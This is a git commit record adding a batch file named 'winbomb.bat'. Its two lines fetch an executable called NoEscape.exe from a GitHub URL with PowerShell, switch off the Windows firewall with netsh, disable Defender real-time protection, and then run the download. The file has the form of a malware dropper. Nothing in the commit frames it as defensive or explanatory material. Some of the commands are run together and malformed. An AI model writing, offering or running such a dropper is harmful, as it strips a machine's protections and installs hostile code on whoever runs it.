8fa3dcc28aca2bab5a5c2ee8a0173bc64fd9c2d0
kl3./?* <93114238+Stridre@users.noreply.github.com>
2025-02-22 21:36:52 +0700

    Add files via upload

---
+++ winbomb.bat
@@ -0,0 +1,2 @@
+start cmd.exe /c
+powershell wget https://github.com/roadmanlazer/NoEscape.exe-Download/blob/main/NoEscape.exe/NoEscape.exe E cmd netsh advfirewall set all state off Set-MpPreference -DisableRealtimeMonitoring $true  cd Downloads NoEscape.exe
